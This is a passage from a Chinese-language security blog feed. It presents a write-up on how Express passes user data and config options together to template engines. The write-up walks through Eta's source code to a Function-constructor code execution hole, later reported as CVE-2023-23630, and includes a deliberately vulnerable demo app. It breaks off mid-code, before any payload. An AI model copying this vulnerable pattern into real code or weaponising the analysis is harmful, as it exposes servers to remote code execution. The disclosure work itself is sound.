    <summary type="html">今年來幫 AIS3 Pre-exam 來出題，共出了 1 題 crypto（2DES），3 題 web（Login Panel, E-Portfolio, E-Portfolio baby），裡面是我的 write-up。</summary>
    
    
    
    <category term="AIS3" scheme="https://ching367436.github.io/categories/AIS3/"/>
    
    <category term="Pre-exam" scheme="https://ching367436.github.io/categories/AIS3/Pre-exam/"/>
    
    
    <category term="AIS3" scheme="https://ching367436.github.io/tags/AIS3/"/>
    
    <category term="CTF" scheme="https://ching367436.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>AIS3 2022 最佳專題</title>
    <link href="https://ching367436.github.io/ais3-2022-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/"/>
    <id>https://ching367436.github.io/ais3-2022-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/</id>
    <published>2023-04-08T07:40:39.000Z</published>
    <updated>2023-04-08T07:40:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>今年在 <a class="link" href="https://ais3.org/2022">AIS3 2022 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 研究了 <a class="link" href="https://expressjs.com/">Express JS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 與 <a class="link" href="https://expressjs.com/en/guide/using-template-engines.html">template engine <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 一起使用會有的資安問題。最後找到了 EJS ZeroDay RCE、Eta ZeroDay RCE&amp;XSS 以及一個已經有 CVE 的 Squirrelly ZeroDay RCE。我把我負責的 Eta ZeroDay RCE 回報給作者後，兩天內完成修補，取得 <a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2023-23630">CVE-2023-23630 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。隨後 <a class="link" href="https://www.cve.org/CVERecord?id=CVE-2022-25967">CVE-2022-25967 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的 <a class="link" href="https://github.com/advisories/GHSA-mf6x-hrgr-658f">security advisory <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 被發布，那其實是同個洞 / 類似的洞。我的漏洞報告在<a class="link" href="https://hackmd.io/@Ching367436/SkkvuMAoi">這裡 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>感謝當時的隊友 Entroy、Lillian 以及 hurosu 的幫忙。</p><!-- https://entroychang.github.io/2023/03/06/NodeJS-template-CVEs#eta-template --><h2 id="專題"><a href="#專題" class="headerlink" title="專題"></a>專題</h2><h3 id="發現"><a href="#發現" class="headerlink" title="發現"></a>發現</h3><p>在 AIS3 課程期間，隊友 Entroy 發現了 <a class="link" href="https://entroychang.github.io/2023/03/06/NodeJS-template-CVEs#ejs-template">EJS ZeroDay RCE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的洞。 那是與 Cyku 大大在 AIS3 EOF 2020 Final 出的 <a class="link" href="https://twitter.com/cyku_tw/status/1362409802404610048">echo2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 相關的洞。Entroy 把他那題的 write-up 給我，我了解了那個洞的原理後，也開始來挖洞了！</p><!-- https://hackmd.io/@entroy/Skcv5DlK5 --><h3 id="原理及目標挑選"><a href="#原理及目標挑選" class="headerlink" title="原理及目標挑選"></a>原理及目標挑選</h3><p>那個洞只要能跟 Express JS 配在一起的 template engine 都可能會有的，問題的根源就在於 Express JS 的 <a class="link" href="https://expressjs.com/en/advanced/developing-template-engines.html">template engine API <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的設計。</p><h4 id="Express-JS-Template-engine-API"><a href="#Express-JS-Template-engine-API" class="headerlink" title="Express JS Template engine API"></a>Express JS Template engine API</h4><p>下方是 Express JS 的官方文件範例，第一個是 app.js：主程式，第二個是 views/index.ntl：template file。這個程式做的就是當使用者去訪問 <code>/</code> 的時候，會把 views/index.ntl render 起來傳回去。</p><p>我們要關注的是 <code>:3</code> <code>app.engine</code> 的第 2 個參數，那就是要接上 Express JS 的 template engine 本體。可以知道 template engine 可以取得的資訊有 <code>(filePath, options, callback)</code>。接著我們來看一下真實世界的 template engine 是怎麼實作的。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>) <span class="comment">// this engine requires the fs module</span></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">'ntl'</span>, <span class="function">(<span class="params">filePath, options, callback</span>) =&gt;</span> { <span class="comment">// define the template engine</span></span><br><span class="line">  fs.<span class="title function_">readFile</span>(filePath, <span class="function">(<span class="params">err, content</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="title function_">callback</span>(err)</span><br><span class="line">    <span class="comment">// this is an extremely simple template engine</span></span><br><span class="line">    <span class="keyword">const</span> rendered = content.<span class="title function_">toString</span>()</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">'#title#'</span>, <span class="string">`&lt;title&gt;<span class="subst">${options.title}</span>&lt;/title&gt;`</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">'#message#'</span>, <span class="string">`&lt;h1&gt;<span class="subst">${options.message}</span>&lt;/h1&gt;`</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="literal">null</span>, rendered)</span><br><span class="line">  })</span><br><span class="line">})</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">'views'</span>, <span class="string">'./views'</span>) <span class="comment">// specify the views directory</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">'view engine'</span>, <span class="string">'ntl'</span>) <span class="comment">// register the template engine</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">'/'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">'index'</span>, { <span class="attr">title</span>: <span class="string">'Hey'</span>, <span class="attr">message</span>: <span class="string">'Hello there!'</span> })</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- views/index.ntl --&gt;</span></span><br><span class="line">#title#</span><br><span class="line">#message#</span><br></pre></td></tr></table></figure></div><h5 id="真實世界的-template-engine"><a href="#真實世界的-template-engine" class="headerlink" title="真實世界的 template engine"></a>真實世界的 template engine</h5><p>來看看 Eta 及 EJS 跟 Express 接合處的 code。</p><h6 id="Eta"><a href="#Eta" class="headerlink" title="Eta"></a>Eta</h6><p>看到 <code>renderFile</code> <code>:8</code> 的註解，Eta 的 <code>renderFile</code> 有 overload 成 <code>(filename, dataAndOptions, cb)</code> 及 <code>(filename, data, options, cb)</code> 。而前者是特別做給 Express 用的（<code>:10</code>），吃的是 <code>dataAndOptions</code>，<strong>所以 <code>data</code> 跟 <code>options</code> 是被混在一起的</strong>。那是 Express 預設的行為，Express 會把對他的設定一起跟 <code>data</code> 放到 <code>dataAndOptions</code> 裡面。 <code>data</code> 很多情況下會是使用者可控的，而  <code>options</code> 則否，把他混在一起不就讓這兩個東西都很容易被一起控制嗎？</p><p><a class="link" href="https://github.com/eta-dev/eta/blob/v1.14.2/src/file-handlers.ts#L186-L239">https://github.com/eta-dev/eta/blob/v1.14.2/src/file-handlers.ts#L186-L239 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">renderFile</span>(<span class="params"></span></span><br><span class="line"><span class="params">  filename: string,</span></span><br><span class="line"><span class="params">  data: DataObj,</span></span><br><span class="line"><span class="params">  config?: PartialConfig,</span></span><br><span class="line"><span class="params">  cb?: CallbackFn</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Promise</span>&lt;string&gt; | <span class="keyword">void</span> {</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  Here we have some function overloading.</span></span><br><span class="line"><span class="comment">  Essentially, the first 2 arguments to renderFile should always be the filename and data</span></span><br><span class="line"><span class="comment">  However, with Express, configuration options will be passed along with the data.</span></span><br><span class="line"><span class="comment">  Thus, Express will call renderFile with (filename, dataAndOptions, cb)</span></span><br><span class="line"><span class="comment">  And we want to also make (filename, data, options, cb) available</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure></div><h6 id="EJS"><a href="#EJS" class="headerlink" title="EJS"></a>EJS</h6><p>看到 <code>:22</code>，又是一個把 <code>data</code> 跟 <code>options</code> 混在一起的，而那都是為了 Express 。</p><p><a class="link" href="https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L441-L489">https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L441-L489 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">renderFile</span> = <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> args = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">  <span class="keyword">var</span> filename = args.<span class="title function_">shift</span>();</span><br><span class="line">  <span class="keyword">var</span> cb;</span><br><span class="line">  <span class="keyword">var</span> opts = {<span class="attr">filename</span>: filename};</span><br><span class="line">  <span class="keyword">var</span> data;</span><br><span class="line">  <span class="keyword">var</span> viewOpts;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do we have a callback?</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">arguments</span>[<span class="variable language_">arguments</span>.<span class="property">length</span> - <span class="number">1</span>] == <span class="string">'function'</span>) {</span><br><span class="line">    cb = args.<span class="title function_">pop</span>();</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">// Do we have data/opts?</span></span><br><span class="line">  <span class="keyword">if</span> (args.<span class="property">length</span>) {</span><br><span class="line">    <span class="comment">// Should always have data obj</span></span><br><span class="line">    data = args.<span class="title function_">shift</span>();</span><br><span class="line">    <span class="comment">// Normal passed opts (data obj + opts obj)</span></span><br><span class="line">    <span class="keyword">if</span> (args.<span class="property">length</span>) {</span><br><span class="line">      <span class="comment">// Use shallowCopy so we don't pollute passed in opts obj with new vals</span></span><br><span class="line">      utils.<span class="title function_">shallowCopy</span>(opts, args.<span class="title function_">pop</span>());</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Special casing for Express (settings + opts-in-data)</span></span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">      <span class="comment">// Express 3 and 4</span></span><br><span class="line">      <span class="keyword">if</span> (data.<span class="property">settings</span>) {</span><br><span class="line">        <span class="comment">// Pull a few things from known locations</span></span><br><span class="line"><span class="comment">// 略...</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">tryHandleCache</span>(opts, data, cb);</span><br><span class="line">};</span><br></pre></td></tr></table></figure></div><p>所以我們知道，很多 template engine 為了配合 Express，都會有同一種不安全的行為：讓 <code>config</code> 可能有機會被使用者控制。而 <code>config</code> 若被控制，就很有可能達到 REC，因為通常都會認為 <code>config</code> 是不應該被控制的，不會有太多防護機制。</p><p>所以我就直接到 <a class="link" href="https://expressjs.com/en/resources/template-engines.html">Express template engines <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 這個官方的頁面去選目標，選到的就是 Eta 。</p><h3 id="Eta-code-review"><a href="#Eta-code-review" class="headerlink" title="Eta code review"></a>Eta code review</h3><p>這邊我使用了 Github Security Lab 所說的<a class="link" href="https://securitylab.github.com/advisories/GHSL-2021-023-squirrelly/#technical-summary">常見的場景 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>這個程式只要使用者去訪問 <code>/?favorite=Eta</code>，就會傳回 <code>&lt;h1&gt;My favorite template engine is Eta &lt;br&gt;&lt;/h1&gt;</code>。</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"dependencies"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"eta"</span><span class="punctuation">:</span> <span class="string">"^1.12.3"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"express"</span><span class="punctuation">:</span> <span class="string">"^4.18.1"</span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> eta = <span class="built_in">require</span>(<span class="string">'eta'</span>)</span><br><span class="line"></span><br><span class="line">app = <span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">"eta"</span>, eta.<span class="property">renderFile</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"view engine"</span>, <span class="string">"eta"</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"views"</span>, <span class="string">"./views"</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">'/'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">"index"</span>, req.<span class="property">query</span>)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">'/app.js'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">'content-type'</span>, <span class="string">'application/js'</span>);</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__filename)</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- views/index.eta --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>My favorite template engine is &lt;%= it.favorite %&gt; <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'app.js'</span>&gt;</span>source<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="renderFile"><a href="#renderFile" class="headerlink" title="renderFile"></a><code>renderFile</code></h4><p>我們已經從上面知道 <code>renderFile</code> 是跟 Express 接在一起的接口，所以我們要從這裡開始看。這邊要知道 Express 會放下來這裡的參數是 <code>(filePath, options, callback)</code>，會對應到 <code>renderFile</code> 的 <code>(filename, data, config)</code>，所以 Eta 會先做一些 overload 的處理。</p><p>看到 :29,47 是處理跟 Express 接合的部分，其中 :32 <code>getConfig(data)</code> 回傳的是一些設定值加上 <code>data</code> 的 deep clone，因為 <code>data</code> 可控（從 app.js:11 <code>res.render("index", req.query)</code> 過來的），所以 <code>renderConfig</code> 也可控。</p><p>然後看到 :52 <code>tryHandleCache(data, renderConfig, callback)</code>。記住使用者可控的東西有 <code>data</code> <code>renderConfig</code>，進入 <code>tryHandleCache</code>。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:869</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderFile</span>(<span class="params">filename, data, config, cb</span>) {</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Here we have some function overloading.</span></span><br><span class="line"><span class="comment">    Essentially, the first 2 arguments to renderFile should always be the filename and data</span></span><br><span class="line"><span class="comment">    However, with Express, configuration options will be passed along with the data.</span></span><br><span class="line"><span class="comment">    Thus, Express will call renderFile with (filename, dataAndOptions, cb)</span></span><br><span class="line"><span class="comment">    And we want to also make (filename, data, options, cb) available</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">var</span> renderConfig;</span><br><span class="line">    <span class="keyword">var</span> callback;</span><br><span class="line">    data = data || {}; <span class="comment">// If data is undefined, we don't want accessing data.settings to error</span></span><br><span class="line">    <span class="comment">// First, assign our callback function to `callback`</span></span><br><span class="line">    <span class="comment">// We can leave it undefined if neither parameter is a function;</span></span><br><span class="line">    <span class="comment">// Callbacks are optional</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> cb === <span class="string">'function'</span>) {</span><br><span class="line">        <span class="comment">// The 4th argument is the callback</span></span><br><span class="line">        callback = cb;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> config === <span class="string">'function'</span>) {</span><br><span class="line">        <span class="comment">// The 3rd arg is the callback</span></span><br><span class="line">        callback = config;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// If there is a config object passed in explicitly, use it</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> config === <span class="string">'object'</span>) {</span><br><span class="line">        renderConfig = <span class="title function_">getConfig</span>(config || {});</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">// Otherwise, get the config from the data object</span></span><br><span class="line">        <span class="comment">// And then grab some config options from data.settings</span></span><br><span class="line">        <span class="comment">// Which is where Express sometimes stores them</span></span><br><span class="line">        renderConfig = <span class="title function_">getConfig</span>(data);</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">settings</span>) {</span><br><span class="line">            <span class="comment">// Pull a few things from known locations</span></span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">settings</span>.<span class="property">views</span>) {</span><br><span class="line">                renderConfig.<span class="property">views</span> = data.<span class="property">settings</span>.<span class="property">views</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">settings</span>[<span class="string">'view cache'</span>]) {</span><br><span class="line">                renderConfig.<span class="property">cache</span> = <span class="literal">true</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// Undocumented after Express 2, but still usable, esp. for</span></span><br><span class="line">            <span class="comment">// items that are unsafe to be passed along with data, like `root`</span></span><br><span class="line">            <span class="keyword">var</span> viewOpts = data.<span class="property">settings</span>[<span class="string">'view options'</span>];</span><br><span class="line">            <span class="keyword">if</span> (viewOpts) {</span><br><span class="line">                <span class="title function_">copyProps</span>(renderConfig, viewOpts);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Set the filename option on the template</span></span><br><span class="line">    <span class="comment">// This will first try to resolve the file path (see getPath for details)</span></span><br><span class="line">    renderConfig.<span class="property">filename</span> = <span class="title function_">getPath</span>(filename, renderConfig);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">tryHandleCache</span>(data, renderConfig, callback);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="tryHandleCache"><a href="#tryHandleCache" class="headerlink" title="tryHandleCache"></a><code>tryHandleCache</code></h4><p>看到 :6 會回傳 <code>templateFn</code>，然後 :7 在去執行他。所以 <code>handleCache</code> 會回傳的是一個 function，如果可以把 <code>templateFn</code> 控制成我們想要的形狀，:7 就會去執行到。所以我們跟進 <code>handleCache(options)</code>。記住 <code>options</code> 使用者可控。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:816</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">tryHandleCache</span>(<span class="params">data, options, cb</span>) {</span><br><span class="line">    <span class="keyword">if</span> (cb) {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="comment">// Note: if there is an error while rendering the template,</span></span><br><span class="line">            <span class="comment">// It will bubble up and be caught here</span></span><br><span class="line">            <span class="keyword">var</span> templateFn = <span class="title function_">handleCache</span>(options);</span><br><span class="line">            <span class="title function_">templateFn</span>(data, options, cb);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">catch</span> (err) {</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">cb</span>(err);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">// No callback, try returning a promise</span></span><br><span class="line"><span class="comment">// 略...</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="handleCache"><a href="#handleCache" class="headerlink" title="handleCache"></a><code>handleCache</code></h4><p>這邊注意 :3 他從 <code>options</code> 裡拿出了 <code>filename</code>，那是 template file 的位置，可能會覺得 filename 可控，但其實不行，因為 Express 會把他蓋掉。</p><p>繼續跟進 <code>loadFile(filename, options)</code>。記住 <code>options</code> 可控。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:795</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleCache</span>(<span class="params">options</span>) {</span><br><span class="line">    <span class="keyword">var</span> filename = options.<span class="property">filename</span>;</span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">cache</span>) {</span><br><span class="line">        <span class="keyword">var</span> func = options.<span class="property">templates</span>.<span class="title function_">get</span>(filename);</span><br><span class="line">        <span class="keyword">if</span> (func) {</span><br><span class="line">            <span class="keyword">return</span> func;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">loadFile</span>(filename, options);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Caching is disabled, so pass noCache = true</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">loadFile</span>(filename, options, <span class="literal">true</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="loadFile"><a href="#loadFile" class="headerlink" title="loadFile"></a><code>loadFile</code></h4><p>看到 :10 的 <code>return compiledTemplate</code>，那就是上面 <code>tryHandleCache</code> 看到會被執行的 <code>templateFn</code>。</p><p>跟進 :6 的 <code>compile</code> 看看我們可以怎麼控制他。記住使用者可控的有 <code>config</code>。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node_modules/eta/dist/eta.cjs:771</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadFile</span>(<span class="params">filePath, options, noCache</span>) {</span><br><span class="line">    <span class="keyword">var</span> config = <span class="title function_">getConfig</span>(options);</span><br><span class="line">    <span class="keyword">var</span> template = <span class="title function_">readFile</span>(filePath);</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">var</span> compiledTemplate = <span class="title function_">compile</span>(template, config);</span><br><span class="line">        <span class="keyword">if</span> (!noCache) {</span><br><span class="line">            config.<span class="property">templates</span>.<span class="title function_">define</span>(config.<span class="property">filename</span>, compiledTemplate);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> compiledTemplate;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">catch</span> (e) {</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">EtaErr</span>(<span class="string">'Loading file: '</span> + filePath + <span class="string">' failed:\n\n'</span> + e.<span class="property">message</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="compile"><a href="#compile" class="headerlink" title="compile"></a><code>compile</code></h4><p>我們知道這個 <code>compile</code> 會回傳的是一個 function，看看他是怎麼造出 function 的。:9 他透過 <code>ctor</code> 來造出 function，<code>ctor</code> 可從 :9 知道他是 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 或 <code>getAsyncFunctionConstructor()</code>。 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"><code>Function</code></a> 的用途是把字串變成 function，聽到就覺得危險。</p><p>跟進 :11 <code>compileToString(str, options)</code> 來看看我們可以怎麼去控制這個 function。記住使用者可控的有 <code>options</code>。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 